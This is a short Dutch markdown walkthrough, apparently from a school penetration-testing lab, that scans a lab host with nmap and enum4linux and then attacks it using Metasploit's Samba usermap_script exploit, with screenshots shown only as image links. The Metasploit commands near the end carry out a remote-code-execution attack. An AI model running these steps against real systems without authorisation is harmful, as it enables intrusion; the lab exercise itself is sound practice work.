`nmap s1096865` om de poorten te vinden.

![img.png](img.png)

---
`nmap -sV -O s1096865` de flags -sV helpt om de versie van de services te vinden en -O helpt om het besturingssysteem te vinden.

![img_1.png](img_1.png)

---
http scan

`nmap --script http-enum,http-headers,http-methods -p 80 s1096865` de script http-enum helpt om de directories te vinden, http-headers helpt om de headers te vinden en http-methods helpt om de methodes te vinden.
![img_2.png](img_2.png)

---
`nmap -sT -sV s1096865` de flag -sT helpt om de TCP connectie te vinden.

![img_3.png](img_3.png)

---

`enum4linux -a s1096865` 

![img_5.png](img_5.png)

![img_6.png](img_6.png)

![img_7.png](img_7.png)

![img_8.png](img_8.png)

![img_9.png](img_9.png)

---

`use auxiliary/scanner/smb/smb_version` om de module te gebruiken.

`show options` om de opties te zien.

![img_16.png](img_16.png)

`set RHOSTS s1096865` om de host te zetten.

![img_10.png](img_10.png)

`search samba` om de samba exploits te vinden.

![img_11.png](img_11.png)

`use exploit/multi/samba/usermap_script` om de exploit te gebruiken.

![img_12.png](img_12.png)

`set RHOSTS s1096865` om de host te zetten.

`expoit` om de exploit te starten.

![img_13.png](img_13.png)
---
